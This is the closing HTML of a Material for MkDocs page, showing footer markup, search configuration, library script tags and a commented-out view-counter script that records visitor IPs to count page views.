  </script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2023 0x5h1n0k0 </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../../..", "features": ["content.code.annotate", "content.tooltips", "navigation.sections", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../../assets/javascripts/bundle.6c7ad80a.min.js></script> <script src=../../../../assets/javascripts/cursor-effects.js></script> <!-- get ip
        <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
        <script>
            function taskService() {
                this.postListApi = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskService();

            TaskList.postListApi()
                .then(function (result) {

                    function taskService02() {
                        this.getListApiii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                },
                            });
                        };
                    }
                    var TaskListList = new taskService02();

                    TaskListList.getListApiii()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-user").innerHTML = result.data.sl + " times"
                            } else {
                                document.getElementById("view-user").innerHTML = result.data.sl + " time"
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                        
                    function taskService01() {
                        this.getListApii = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/iphomeposts/views_total/",
                                method: "GET",
                            });
                        };
                    }
                    var TaskListt = new taskService01();

                    TaskListt.getListApii()
                        .then(function (result) {
                            document.getElementById("view-all").innerHTML = result.data
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script>

        <script>
            function taskServicePost() {
                this.postListApiTotal = function () {
                    return axios({
                        url: "https://api.ipify.org?format=json",
                        method: "GET",
                    });
                };
            }
            var TaskList = new taskServicePost();
            var arr = window.location.pathname.split('/');


            TaskList.postListApiTotal()
                .then(function (result) {

                    function taskServicePost02() {
                        this.getListApiUser = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views/",
                                method: "POST",
                                data: {
                                    "ip": result.data.ip,
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListUser = new taskServicePost02();

                    TaskListUser.getListApiUser()
                        .then(function (result) {
                            if (result.data.sl > 1) {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " times";
                            } else {
                                document.getElementById("view-post-user").innerHTML = result.data.sl + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });

                        function taskServicePost01() {
                        this.getListApiTotal = function () {
                            return axios({
                                url: "https://bedeu.herokuapp.com/ipposts/views_total/",
                                method: "POST",
                                data: {
                                    "post": arr[arr.length - 2],
                                },
                            });
                        };
                    }
                    var TaskListTotal = new taskServicePost01();

                    TaskListTotal.getListApiTotal()
                        .then(function (result) {
                            if (result.data > 1) {
                                document.getElementById("view-post-all").innerHTML = result.data + " times";
                            } else {
                                document.getElementById("view-post-all").innerHTML = result.data + " time";
                            }
                        })
                        .catch(function (erro) {
                            console.log(erro)
                        });
                })
                .catch(function (erro) {});

        </script> --> <script src=../../../../javascripts/consent.js></script> <script src=../../../../javascripts/mathjax.js></script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script> <script src=https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js></script> <script src=../../../../javascripts/tablesort.js></script> </body> </html>